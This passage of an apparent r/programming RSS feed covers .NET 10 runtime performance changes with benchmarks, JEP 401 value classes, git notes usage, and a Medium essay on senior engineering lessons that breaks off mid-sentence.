href="https://github.com/dotnet/runtime/pull/107325">dotnet/runtime#107325</a>). But arguably more impactful was a series of more than a dozen PRs that enabled the interpreter to vectorize more operations with WebAssembly (Wasm). This included contributions like <a href="https://github.com/dotnet/runtime/pull/114669">dotnet/runtime#114669</a>, which enabled vectorization of shift operations, and <a href="https://github.com/dotnet/runtime/pull/113743">dotnet/runtime#113743</a>, which enabled vectorization of a plethora of operations like <code>Abs</code>, <code>Divide</code>, and <code>Truncate</code>. Other PRs used the Wasm-specific intrinsic APIs in more places, in order to accelerate on Wasm routines that were already accelerated on other architectures using architecture-specific intrinsics, e.g. <a href="https://github.com/dotnet/runtime/pull/115062">dotnet/runtime#115062</a> used <code>PackedSimd</code> in the workhorse methods behind the hex conversion routines on <code>Convert</code>, like <code>Convert.FromBase64String</code>.</li> <li><strong>FCALLs</strong>. There are many places in the lower-layers of <code>System.Private.CoreLib</code> where managed code needs to call into native code in the runtime. There are two primary ways this transition from managed to native has happened, historically. One method is through what&rsquo;s called a &ldquo;QCALL&rdquo;, essentially just a DllImport (P/Invoke) into native functions exposed by the runtime. The other, which historically was the dominant mechansim, is an &ldquo;FCALL,&rdquo; which is a more complex and specialized pathway that allows direct access to managed objects from native code. FCALLs were once the standard, but over time, more of them were converted to QCALLs. This shift improves reliability (since FCALLs are notoriously tricky to implement correctly) and can also boost performance, as FCALLs require helper method frames, which QCALLs can often avoid. A ton of PRs in .NET 10 went into removing FCALLs, like <a href="https://github.com/dotnet/runtime/pull/107218">dotnet/runtime#107218</a> for helper method frames in <code>Exception</code>, <code>GC</code>, and <code>Thread</code>, <a href="https://github.com/dotnet/runtime/pull/106497">dotnet/runtime#106497</a> for helper method frames in <code>object</code>, <a href="https://github.com/dotnet/runtime/pull/107152">dotnet/runtime#107152</a> for those used in connecting to profilers, <a href="https://github.com/dotnet/runtime/pull/108415">dotnet/runtime#108415</a> and <a href="https://github.com/dotnet/runtime/pull/108535">dotnet/runtime#108535</a> for ones in reflection, and over a dozen others. In the end, all FCALLS that touched managed memory or threw exceptions were removed.</li> <li><strong>Converting hex.</strong> Recent .NET releases added methods to <code>Convert</code> like <code>FromHexString</code> and <code>TryToHexStringLower</code>, but such methods all used UTF16. <a href="https://github.com/dotnet/runtime/pull/117965">dotnet/runtime#117965</a> adds overloads of these that work with UTF8 bytes.</li> <li><strong>Formatting.</strong> String interpolation is backed by &ldquo;interpolated string handlers.&rdquo; When you interpolate with a string target type, by default you get the <code>DefaultInterpolatedStringHandler</code> that comes from <code>System.Runtime.CompilerServices</code>. That implementation is able to use stack-allocated memory and the <code>ArrayPool&lt;&gt;</code> for reduced allocation overheads as it&rsquo;s buffering up text formatted to it. While very advanced, other code, including other interpolated string handlers, can use <code>DefaultInterpolatedStringHandler</code> as an implementation detail. However, when doing so, such code only could get access to the final output as a <code>string</code>; the underlying buffer wasn&rsquo;t exposed. <a href="https://github.com/dotnet/runtime/pull/112171">dotnet/runtime#112171</a> adds a <code>Text</code> property to <code>DefaultInterpolatedStringHandler</code> for code that wants access to the already formatted text in a <code>ReadOnlySpan<char></char></code>.</li> <li><strong>Enumeration-related allocations.</strong> <a href="https://github.com/dotnet/runtime/pull/118288">dotnet/runtime#118288</a> removes a handful of allocations related to enumeration, for example removing a <code>string.Split</code> call in <code>EnumConverter</code> and replacing it with a <code>MemoryExtensions.Split</code> call that doesn&rsquo;t need to allocate either the <code>string[]</code> or the individual <code>string</code> instances.</li> <li><strong>NRBF decoding.</strong> <a href="https://github.com/dotnet/runtime/pull/107797">dotnet/runtime#107797</a> from <a href="https://github.com/teo-tsirpanis">@teo-tsirpanis</a> removes an array allocation used in a <code>decimal</code> constructor call, replacing it instead with a collection expression targeting a span, which will result in the state being stack allocated.</li> <li><strong>TypeConverter allocations.</strong> <a href="https://github.com/dotnet/runtime/pull/111349">dotnet/runtime#111349</a> from <a href="https://github.com/AlexRadch">@AlexRadch</a> reduces some parsing overheads in the <code>TypeConverter</code>s for <code>Size</code>, <code>SizeF</code>, <code>Point</code>, and <code>Rectangle</code> by using more modern APIs and constructs, such as the span-based <code>Split</code> method and string interpolation.</li> <li><strong>Generic math conversions.</strong> Most of the <code>TryConvertXx</code> methods using the various primitive&rsquo;s implementations of the generic math interfaces are marked as <code>MethodImplOptions.AggressiveInlining</code>, to help the JIT realize they should always be inlined, but a few stragglers were left out. <a href="https://github.com/dotnet/runtime/pull/112061">dotnet/runtime#112061</a> from <a href="https://github.com/hez2010">@hez2010</a> fixes that.</li> <li><strong>ThrowIfNull.</strong> C# 14 now supports the ability to write extension static methods. This is a huge boon for libraries that need to support downlevel targeting, as it means static methods can be polyfilled just as instance methods can be. There are many libraries in .NET that build not only for the latest runtimes but also for .NET Standard 2.0 and .NET Framework, and those libraries have been unable to use helper static methods like <code>ArgumentNullException.ThrowIfNull</code>, which can help to streamline call sites and make methods more inlineable (in addition, of course, to tidying up the code). Now that the dotnet/runtime repo builds with a C# 14 compiler, <a href="https://github.com/dotnet/runtime/pull/114644">dotnet/runtime#114644</a> replaced ~2500 call sites in such libraries with use of a <code>ThrowIfNull</code> polyfill.</li> <li><strong>FileProvider Change Tokens</strong>. <a href="https://github.com/dotnet/runtime/pull/116175">dotnet/runtime#116175</a> reduces allocation in <code>PollingWildCardChangeToken</code> by using allocation-free mechanisms for computing hashes, while <a href="https://github.com/dotnet/runtime/pull/115684">dotnet/runtime#115684</a> from <a href="https://github.com/rameel">@rameel</a> reduces allocation in <code>CompositeFileProvider</code> by avoiding taking up space for nop <code>NullChangeToken</code>s.</li> <li><strong>String interpolation.</strong> <a href="https://github.com/dotnet/runtime/pull/114497">dotnet/runtime#114497</a> removes a variety of null checks when dealing with nullable inputs, shaving off some overheads of the interpolation operation.<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private string _value = " "; [Benchmark] public string Interpolate() =&gt; $"{_value} {_value} {_value} {_value}"; }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Interpolate</td> <td>.NET 9.0</td> <td>34.21 ns</td> <td>1.00</td> </tr> <tr> <td>Interpolate</td> <td>.NET 10.0</td> <td>29.47 ns</td> <td>0.86</td> </tr> </tbody> </table> </li> <li><strong><code>AssemblyQualifiedName</code></strong>. <code>Type.AssemblyQualifiedName</code> previously recomputed the result on every access. As of <a href="https://github.com/dotnet/runtime/issues/118389">dotnet/runtime#118389</a>, it&rsquo;s now cached.<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { [Benchmark] public string AQN() =&gt; typeof(Dictionary<int>).AssemblyQualifiedName!; }</int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>AQN</td> <td>.NET 9.0</td> <td>132.345 ns</td> <td>1.007</td> <td>712 B</td> <td>1.00</td> </tr> <tr> <td>AQN</td> <td>.NET 10.0</td> <td>1.218 ns</td> <td>0.009</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table> </li> </ul> <h2>What&rsquo;s Next?</h2><p>Whew! After all of that, I hope you&rsquo;re as excited as I am about .NET 10, and more generally, about the future of .NET.</p><p>As you&rsquo;ve seen in this tour (and in those for previous releases), the story of .NET performance is one of relentless iteration, systemic thinking, and the compounding effect of many targeted improvements. While I&rsquo;ve highlighted micro-benchmarks to show specific gains, the real story isn&rsquo;t about these benchmarks&hellip; it&rsquo;s about making real-world applications more responsive, more scalable, more sustainable, more economical, and ultimately, more enjoyable to build and use. Whether you&rsquo;re shipping high-throughput services, interactive desktop apps, or resource-constrained mobile experiences, .NET 10 offers tangible performance benefits to you and your users.</p><p>The best way to appreciate these improvements is to try <a href="https://dotnet.microsoft.com/download/dotnet/10.0">.NET 10 RC1</a> yourself. Download it, run your workloads, measure the impact, and share your experiences. See awesome gains? Find a regression that needs fixing? Spot an opportunity for further improvement? Shout it out, open an issue, even send a PR. Every bit of feedback helps make .NET better, and we look forward to continuing to build with you.</p><p>Happy coding!</p></div></article><div class="gallery"><p><img src="https://devblogs.microsoft.com/dotnet/wp-content/uploads/sites/10/2025/09/CA2024.png"></p><p><img src="https://devblogs.microsoft.com/dotnet/wp-content/uploads/sites/10/2025/09/CA1874.png"></p></div></section>]]></description><pubDate>Wed, 10 Sep 2025 19:15:08 +0530</pubDate></item><item><link>https://www.reddit.com/r/java/comments/1nckdwr/jep_401_value_classes_and_objects_preview_has/</link><title>JEP 401: Value classes and Objects (Preview) has just been submitted! (/r/programming)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nd8vob/jep_401_value_classes_and_objects_preview_has/</guid><comments>https://www.reddit.com/r/programming/comments/1nd8vob/jep_401_value_classes_and_objects_preview_has/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nd8vob/jep_401_value_classes_and_objects_preview_has/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>The JDK it is coming out in is still not known. However, this is a major milestone to have crossed. Plus, a new Early Access build of Valhalla (up-to-date with the current JDK, presumably) will go live soon too. Details in the linked post.</p><p>And for those unfamiliar, <a href="https://www.reddit.com/u/brian_goetz">u/brian_goetz</a> is the person leading the Project Valhalla effort. So, comments by him in the linked post can help you separate between assumptions by your average user vs the official words from the Open JDK Team themselves. <a href="https://www.reddit.com/u/pron98">u/pron98</a> is another OpenJDK Team member commenting in the linked post.</p></div><!-- SC_ON --></section><section class='separator separator-after-selftext'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><div><p><span> <faceplate-tracker> <a href="https://www.reddit.com/r/java/">r/java</a> </faceplate-tracker> </span></p><faceplate-tracker> <shreddit-join-button></shreddit-join-button> </faceplate-tracker> </div><p>News, Technical discussions, research papers and assorted things of interest related to the Java programming language NO programming help, NO learning Java related questions, NO installing or downloading Java questions, NO JVM languages - Exclusively Java </p><hr><p><span> <span>Members</span> </span> <span> <span> <span>Online</span> </span> </span> </p></div><div class="gallery"><p><img src="https://styles.redditmedia.com/t5_2qhd7/styles/communityIcon_tzuj58g8ax451.png?width=96&amp;height=96&amp;frame=1&amp;auto=webp&amp;crop=96%3A96%2Csmart&amp;s=75ed46fab979da9835d3c7bcda4ee5b3d4ec4a88"></p></div></section>]]></description><pubDate>Wed, 10 Sep 2025 14:16:19 +0530</pubDate></item><item><link>https://tylercipriani.com/blog/2022/11/19/git-notes-gits-coolest-most-unloved-feature/</link><title>Git Notes: git's coolest, most unloved­ feature (tylercipriani.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nd8nsi/git_notes_gits_coolest_most_unloved_feature/</guid><comments>https://www.reddit.com/r/programming/comments/1nd8nsi/git_notes_gits_coolest_most_unloved_feature/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 6 min | <a href='https://www.reddit.com/r/programming/comments/1nd8nsi/git_notes_gits_coolest_most_unloved_feature/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Did YOU know...? And if you did, what do you use it for?</p></div><!-- SC_ON --></section><section class='separator separator-after-selftext'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><article> <section> <blockquote><p>the short of it is: they&rsquo;re cool for appending notes from automated systems (like ticket or build systems) but not really for having interactive conversations with other developers (at least not yet)</p><p>&ndash; Scott Chacon, <a href="https://github.blog/2010-08-25-git-notes-display/">GitHub.blog</a>, Aug.&nbsp;2010</p></blockquote><p>Git notes are almost a secret.</p><p>They&rsquo;re buried by their own distressing usability.</p><p>But git notes are continually rediscovered by engineers trying to stash metadata inside git.</p><figure> <img src="https://photos.tylercipriani.com/2022-10-30_simonw-git-notes.png" alt="Sun, 30 Oct 2022 11:05 @simonw"> </figure><p><strong>Git notes are powerful tools.</strong> And they could solve so many problems&mdash;if only they were better known and easier to use.</p><section> <h2><span>&#129488;</span> What are git notes?</h2><p>A common use of git notes is tacking metadata onto commits.</p><p>Once a commit cements itself in git&rsquo;s history&mdash;that&rsquo;s it. It&rsquo;s impossible to amend a commit message buried deep in a repo&rsquo;s log<a href="https://tylercipriani.com#fn1"><sup>1</sup></a>.</p><p>But git notes enable you to amend new information about old commits in a special namespace. And they&rsquo;re capable of so much more.</p><p><strong>Notes stow metadata about anything tracked by git</strong>&mdash;any object: commits, blobs, and trees. All without futzing with the object itself.</p><p>You add notes to the latest commit in a repo like this:</p><pre><code>git notes add -m 'Acked-by: <tyler>'</tyler></code></pre><p>And then it shows up in <code>git log</code>:</p><pre><code>commit 1ef8b30ab7fc218ccc85c9a6411b1d2dd2925a16 Author: Tyler Cipriani <thcipriani> Date: Thu Nov 17 16:51:43 2022 -0700 Initial commit Notes: Acked-by: <tyler></tyler></thcipriani></code></pre> </section> <section> <h2><span>&#129406;</span> Git notes in the wild</h2><p>The git project itself offers an example of git notes in the wild. They link each commit to its discussion on their mailing list.</p><p>For example:</p><pre><code>commit 00f09d0e4b1826ee0519ea64e919515032966450 Author: <redacted> Date: Thu Jan 28 02:05:55 2010 +0100 bash: support 'git notes' and its subcommands ... Notes (amlog): Message-Id: &lt;1264640755-22447-1-git-send-email-szeder@ira.uka.de&gt;</redacted></code></pre><p>This commit&rsquo;s notes point intrepid users to the <a href="https://lore.kernel.org/git/1264640755-22447-1-git-send-email-szeder@ira.uka.de/">thread where this patch was discussed</a>.</p><p>Other folks are using notes for things like:</p><ul> <li>Tracking time spent per commit or branch</li> <li>Adding review and testing information to git log</li> <li>And even fully distributed code review</li> </ul> </section> <section> <h2><span>&#128230;</span> Storing code reviews and test results in git notes</h2><p>Here is a plea for all forges: make code review metadata available offline, inside git.</p><p>The <a href="https://gerrit.googlesource.com/plugins/reviewnotes/+/refs/heads/master/src/main/resources/Documentation/refs-notes-review.md">reviewnotes</a> plugin for Gerrit<a href="https://tylercipriani.com#fn2"><sup>2</sup></a> is an example of how to do this well. It makes it easy to see who reviewed code in git log:</p><pre><code>git fetch origin refs/notes/review:refs/notes/review git log --show-notes=review</code></pre><p>The command above shows me all the standard git log info alongside information about what tests ran and who reviewed the code. All without forcing me into my browser.</p><pre><code>commit d1d17908d2a97f057887a4afbd99f6c40be56849 Author: User <user> Date: Sun Mar 27 18:10:51 2022 +0200 Change the thing Notes (review): Verified+1: SonarQube Bot Verified+2: jenkins-bot Code-Review+2: Reviewer Human <reviewerhuman> Submitted-by: jenkins-bot Submitted-at: Tue, 14 Jun 2022 21:59:58 +0000 Reviewed-on: https://gerrit.wikimedia.org/r/c/mediawiki/core/+/774005 Project: mediawiki/core Branch: refs/heads/master</reviewerhuman></user></code></pre> </section> <section> <h2><span>&#128160;</span> Distributed code review <u>inside</u> git notes</h2><p>Motivated hackers can knead and extend git notes. Using them as distributed storage for any madcap idea.</p><p>Someone at Google cobbled together a full-on code review system teetering atop git notes called <a href="https://github.com/google/git-appraise">git-appraise</a>.</p><p>Its authors have declared it a &ldquo;fully distributed code review&rdquo;&mdash;independent of GitHub, GitLab, or any other code forge.</p><p>This system lets you:</p><ul> <li>Request review of a change</li> <li>Comment on a change</li> <li>Review and merge a change</li> </ul><p>And you can do all this from your local computer, even if GitHub is down.</p><p>Plus, it&rsquo;s equipped with an affectedly unaesthetic web interface, if that&rsquo;s your thing.</p><figure> <img src="https://photos.tylercipriani.com/2022-11-27_git-appraise-web.png" alt="The git-appraise web interface, in all its NaN-line-numbering glory."> </figure> </section> <section> <h2><span>&#128557;</span> No one uses git notes</h2><p>Git notes are a pain to use.</p><p>And GitHub <a href="https://github.blog/2010-08-25-git-notes-display/">opted to stop displaying commit notes in 2014</a> without much explanation.</p><p>For commits, you can make viewing and adding notes easier using fancy options in your gitconfig<a href="https://tylercipriani.com#fn3"><sup>3</sup></a>. But for storing notes about blobs or trees? Forget it. You&rsquo;d need to be comfortable rooting around in git&rsquo;s <a href="https://git-scm.com/book/en/v2/Git-Internals-Plumbing-and-Porcelain">plumbing</a> first.</p><p>So, for now: <strong>git notes are relegated to obscurity</strong>. Forever hamstrung by an obscure and clunky interface and limited adoption&mdash;I often forget they&rsquo;re there.</p></section> <section> <h2><span>&#128509;</span> Forge independence</h2><p>Git is a distributed code review system. But much of the value of git repos ends up locked into forges, like GitHub.</p><p>Git notes are a path toward an alternative.</p><p>Git distributes the history of a piece of code. <strong>Git notes could make it possible to distribute the history of an entire project.</strong></p></section> <section> <hr> <ol> <li><p>Without having to endure the <a href="https://groups.google.com/g/jenkinsci-dev/c/-myjRIPcVwU/m/mrwn8VkyXagJ">perils of a force push</a>, anyway.<a href="https://tylercipriani.com#fnref1">&#8617;&#65038;</a></p></li> <li><p>The code review system used for <a href="https://gerrit.wikimedia.org/r/">a</a> <a href="https://go-review.googlesource.com/">couple</a> of <a href="https://android-review.googlesource.com/">bigish</a> <a href="https://chromium-review.googlesource.com/">projects</a>.<a href="https://tylercipriani.com#fnref2">&#8617;&#65038;</a></p></li> <li><p>Noteably by automagically fetching notes and displaying them in <code>git log</code> via:</p><pre><code>$ git config --add \ remote.origin.fetch \ '+refs/notes/*:refs/notes/*' $ git config \ notes.displayRef \ 'refs/notes/*'</code></pre> <a href="https://tylercipriani.com#fnref3">&#8617;&#65038;</a></li> </ol> </section> </section> </article> </section>]]></description><pubDate>Wed, 10 Sep 2025 14:01:55 +0530</pubDate></item><item><link>https://github.com/Voultapher/sort-research-rs/blob/main/writeup/unreasonable/text.md</link><title>The unreasonable effectiveness of modern sort algorithms (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nd7bby/the_unreasonable_effectiveness_of_modern_sort/</guid><comments>https://www.reddit.com/r/programming/comments/1nd7bby/the_unreasonable_effectiveness_of_modern_sort/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 3 min | <a href='https://www.reddit.com/r/programming/comments/1nd7bby/the_unreasonable_effectiveness_of_modern_sort/'>Post permalink</a></p></section><section class='preview-image'><img src='https://opengraph.githubassets.com/88524f7c8a01d0d4944a3a40a78142db7ebeb7081d3e8a8aa8381149d161c5fd/Voultapher/sort-research-rs' /></section><section class='parsed-content'><div><qbsearch-input><div><dialog-helper> <dialog><div><h2> Provide feedback </h2> </div><scrollable-region><div><form><p>We read every piece of feedback, and take your input very seriously.</p><label>Include my email address so I can be contacted</label> </form></div></scrollable-region> </dialog></dialog-helper> <custom-scopes> <dialog-helper> <dialog><div><h2> Saved searches </h2> <h2>Use saved searches to filter your results more quickly</h2> </div><scrollable-region> </scrollable-region> </dialog></dialog-helper> </custom-scopes> </div></qbsearch-input><div><p><a href="/login?return_to=https%3A%2F%2Fgithub.com%2FVoultapher%2Fsort-research-rs%2Fblob%2Fmain%2Fwriteup%2Funreasonable%2Ftext.md"> Sign in </a> </p></div><p><a href="https://github.com/signup?ref_cta=Sign+upref_loc=header+logged+out&amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&amp;source=header-repo&amp;source_repo=Voultapher%2Fsort-research-rs">/<repo-name>/blob/show;ref_cta:Sign up;ref_loc:header logged out"}"&gt; Sign up </repo-name></a></p><p><react-partial-anchor> <tool-tip>Appearance settings</tool-tip><template> <react-partial> </react-partial> </template> </react-partial-anchor> </p></div></section>]]></description><pubDate>Wed, 10 Sep 2025 12:31:35 +0530</pubDate></item><item><link>https://medium.com/@ozdemir.zynl/beyond-the-code-lessons-that-make-you-senior-1ba44469aa42?source=friends_link&amp;sk=b26d67b2b81fe10a800da07bd3415931</link><title>Beyond the Code: Lessons That Make You Senior Software Engineer (medium.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ncx9gw/beyond_the_code_lessons_that_make_you_senior/</guid><comments>https://www.reddit.com/r/programming/comments/1ncx9gw/beyond_the_code_lessons_that_make_you_senior/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 14 min | <a href='https://www.reddit.com/r/programming/comments/1ncx9gw/beyond_the_code_lessons_that_make_you_senior/'>Post permalink</a></p></section><section class='preview-image'><img src='https://miro.medium.com/v2/resize:fit:1020/1*br0DCLdFNA9EX2KqYGtPvQ.png' /></section><section class='parsed-content'><div><figure><div><p><span>Press enter or click to view image in full size</span></p></div></figure><p>Five years ago, I applied for a Senior Software Engineer role. I wasn&rsquo;t entirely sure if I wanted the job, but the product caught my interest. After passing the online assessment, I was invited to the first round of interviews &mdash; and to my surprise, the CTO was on the attendee list.</p><p>The meeting began with quick introductions, and then the CTO took the lead. She didn&rsquo;t waste time: <em>&ldquo;We think your experience isn&rsquo;t enough for a Senior role, but we still wanted to see how you would do.&rdquo;</em> I was a little offended. I was young, but I had already written a lot of code and worked at several companies. This felt like my chance to prove her wrong.</p><p>I braced myself for tough technical questions &mdash; dynamic programming, tricky data structures, maybe some bit manipulation. Instead, the first question was: <em>&ldquo;What is technical debt?&rdquo;</em> I froze. I gave a one-line textbook answer and waited, expecting the real test to begin. But she pressed on: <em>&ldquo;What do you do when deadlines are missed? How do you prioritize tasks? How do you handle conflict in a team?&rdquo;</em> I couldn&rsquo;t hide my frustration. Where were the hard technical problems, the system designs, the algorithm puzzles?</p><p>After the interview, I was convinced she didn&rsquo;t know how to evaluate engineers. But looking back now, I realize she knew exactly what she was doing. She wasn&rsquo;t hiring just a coder. She was looking for someone who could navigate trade-offs, lead people, and think beyond the code itself. I wasn&rsquo;t ready then. But that conversation left me with a lasting realization: <strong>being &ldquo;senior&rdquo; isn&rsquo;t about mastering every protocol or memorizing every algorithm. It&rsquo;s about judgment, working with people, making decisions, thinking long-term, and developing the subtle skills nobody teaches you in school.</strong></p><p>Over the years, I&rsquo;ve made mistakes, worked with incredible teams, and learned lessons the hard way. I once purged a production database. I once argued for days about a design that never shipped. I once ignored a teammate&rsquo;s warning and caused a production crash. Each mistake left a mark, but also a lesson. <strong>Today, I want to share the ones that, looking back, mattered most on the path to becoming a Senior Engineer.</strong></p><p><em>To illustrate these lessons, I&rsquo;ll use a recurring character &mdash; Eddie. He isn&rsquo;t a real person or someone I&rsquo;ve worked with, but a fictional stand-in inspired by my younger self and the situations I&rsquo;ve experienced. Eddie reflects the mistakes I made and the lessons that shaped me.</em></p></div><div><h2>Reasons Over Rules</h2><p>Once, we needed to add new fields to a DynamoDB table in production. Eddie, a bright new joiner, proposed a heavyweight migration &mdash; replicate the table, sync with streams, then cut over after a week of testing. The plan sounded complete, but he hadn&rsquo;t considered simpler options, so I asked, &ldquo;Why not update the existing records with a script?&rdquo; His answer was blunt: &ldquo;That is dangerous. You shouldn&rsquo;t update a prod database&rdquo;, with no reasoning or data.</p><p>Here&rsquo;s the thing: in that specific system, the database didn&rsquo;t serve customer-facing traffic; it powered offline jobs. We could throttle updates, monitor metrics, and roll back if necessary, so the real risk was low compared to the complexity of his plan. We built a simple background updater instead, finished in days, not weeks, and it worked.</p><p>Eddie&rsquo;s approach reflected a common trap: treating &ldquo;best practices&rdquo; as absolute truths. <em>Never touch production. Microservices are always better. Monoliths are bad.</em> Rules like these sound safe, but in reality, they are context-dependent. <strong>True seniority isn&rsquo;t about having a larger catalog of rules. It&rsquo;s about reasoning. Always try to explain why a decision makes sense in a given situation and weigh risks against trade-offs.</strong></p><h2>Don&rsquo;t have assumptions, verify</h2><p>One of the most humbling lessons of my career came during outages. When systems fail, it&rsquo;s easy to jump to conclusions: <em>&ldquo;It must be the database,&rdquo; &ldquo;The new deployment caused it,&rdquo; &ldquo;It&rsquo;s probably transient.&rdquo;</em> But assumptions waste precious hours &mdash; and when production is burning, every minute counts.</p><p>I once spent half a day convinced a feature flag rollout had broken our service. I rolled it back, combed through the code, and chased dead ends. Only later did we uncover the real cause: a dependency update shipped in the same deployment. My tunnel vision had cost the team valuable time.</p><p><strong>The best engineers don&rsquo;t rely on guesswork. They trust data, and use their experience to guide where to look first &mdash; but they always verify.</strong> The real skill isn&rsquo;t having the &ldquo;right hunch&rdquo;; it&rsquo;s having the discipline to check logs, compare graphs, reproduce issues, and ask teammates for sanity checks. Verification solves problems faster and builds credibility. Nothing erodes trust quicker than confidently blaming the wrong thing.</p><h2>Question the Good News</h2><p>Eddie once rushed to my desk, excited: &ldquo;our API latency had dropped 20% after my recent changes&rdquo; I was surprised because his task was just a simple refactor &mdash; it shouldn&rsquo;t have affected latency at all. On the surface, it looked like a win. But when something looks too good to be true, it often is. Instead of celebrating, I asked him, &ldquo;Why did it drop?&rdquo; He was so focused on the positive outcome that he hadn&rsquo;t stopped to question it.</p><p>After digging deeper, we discovered the real story: he had accidentally removed retry logic in our downstream calls. (Yes, it even passed through PR reviews.) The latency improvement wasn&rsquo;t a performance boost, it was because failed requests weren&rsquo;t being retried. Behind the shiny numbers, silent failures were piling up, until alarms went off the next day.</p><p>The bigger lesson here is: always treat sudden miracles with skepticism. When metrics improve overnight, the first question should always be, <em>&ldquo;What did we break?&rdquo;</em> <strong>Healthy skepticism prevents teams from celebrating false wins. It reinforces an essential truth: data is only valuable when you understand the <em>why</em> behind it.</strong></p><h2>Mechanism over good intentions</h2><p>In engineering, I&rsquo;ve lost count of how many times I&rsquo;ve heard, <em>&ldquo;We&rsquo;ll just remember to do X next time.&rdquo;</em> It always comes from good intentions, but good intentions don&rsquo;t protect systems. People get distracted, tired or even pressured by deadlines. I once saw a critical incident triggered because someone forgot to run a post-deploy script. It wasn&rsquo;t that the person was careless; but the process was fragile.</p><p><strong>The strongest teams don&rsquo;t rely on memory or promises. They build mechanisms to make mistakes less likely and recover faster. </strong>Automated checks, CI/CD pipelines, feature flags, two-person approvals, monitoring alerts &mdash; these aren&rsquo;t &ldquo;nice to haves,&rdquo; they are guardrails. Instead of hoping someone remembers to double-check a config, you design the pipeline so the config can&rsquo;t be deployed without validation. Instead of trusting someone to manually run a script, you make the script part of the deployment flow.</p><p>Senior engineers design systems where the safe path is also the easiest path. Mistakes will happen, that&rsquo;s inevitable. What defines a strong engineering culture is whether your system catches those mistakes before your customers do.</p><h2>The Discipline of Saying &ldquo;No&rdquo;</h2><p>Eddie once joined a meeting with one of our clients. They were using our APIs for a critical system and wanted to introduce a new filtering logic that required pulling data from multiple sources. Instead of implementing the logic on their side, they proposed offloading it to our backend. After a long discussion, they convinced Eddie to agree. The plan was that they would contribute the changes as an away team, but the logic would still live in our systems.</p><p>When Eddie shared the outcome the next day, every senior engineer on the team pushed back. The clients didn&rsquo;t have strong reasons for not making the change on their side, they simply wanted to shift the complexity onto ours. Eddie had to go back, explain the decision, and clarify that the proposal wasn&rsquo;t accepted. The back-and-forth caused delays and confusion, but it also left him with an important lesson: sometimes the hardest but most valuable thing you can do is say &ldquo;no.&rdquo;</p><p>I&rsquo;ll admit, this has been one of the toughest lessons in my own career as well.<strong> Senior engineers aren&rsquo;t the ones who say &ldquo;yes&rdquo; to everything. They are the ones who protect their teams from unnecessary complexity, push back when trade-offs don&rsquo;t make sense, and know that not every request deserves to be accepted.</strong></p><h2>Growth Starts With Ownership</h2><p>Early in my career, I leaned heavily on senior teammates. Whenever a decision came up, I defaulted to them, thinking, <em>&ldquo;They know better than me.&rdquo;</em> It felt safe. I had to be certain and confident before making the decision.</p><p>But the truth is, engineering is full of uncertainty. Rarely do we have perfect information, and waiting for it leads to paralysis.<strong> Seniors aren&rsquo;t people who always have the right answer; they are people who make informed calls, weigh trade-offs, and take responsibility</strong>. When those decisions turn out to be wrong, they don&rsquo;t deflect blame. Instead, they own the outcome, learn, and adjust.</p><h2>From Protector to Mentor</h2><p>When I first began mentoring juniors like Eddie, my instinct was to shield them from failure. I&rsquo;d leave long review comments, walk them through every design detail, or even step in and write the code myself. It felt efficient in the moment, but it slowed their growth. Protecting someone from mistakes may prevent short-term pain, but it also deprives them of the lessons that only come from firsthand experience.</p><p>With time, I realized my role wasn&rsquo;t to prevent errors but to create a safe space where mistakes could happen without catastrophic consequences. Real growth comes from stumbling, recovering, and carrying those lessons forward. <strong>The ultimate measure of leadership is whether the team can thrive without you. If you&rsquo;ve built a culture where people learn through safe failure, then you&rsquo;ve done your job as a mentor.</strong></p><h2>Simplicity Scales, Complexity Breaks</h2><p>One of the hardest lessons for ambitious engineers to learn is that simple almost always beats clever. In uncertain situations, it is tempting to design for every possible scenario, &ldquo;future-proofing&rdquo; the system with abstractions and extensibility. But more often than not, those extra layers turn into dead weight.</p><p>I once watched a team build a sophisticated plugin framework for &ldquo;future integrations.&rdquo; It had its own configuration DSL and multiple extension points. Three years later, not a single plugin had ever been written! But every change in the system had to navigate around that unused complexity. What looked like foresight in the moment turned into drag over time.</p><p><strong>Try to avoid premature complexity at all costs. Simple solutions aren&rsquo;t just easier to write; they are easier to test, maintain, and onboard new engineers onto. </strong>They age gracefully because they carry fewer assumptions.</p><h2>Every System Breaks Eventually, Be Prepared</h2><p>No system is truly fault-tolerant. Code is alive &mdash; it evolves, integrates with new dependencies, and adapts to changing requirements. Each modification, no matter how small and well tested, increases the chance of introducing failures.</p><p>I once worked on an API that returned the list of projects a user owned. We never documented any guarantees about ordering, but because of the way our SQL query was written, results always happened to come back in 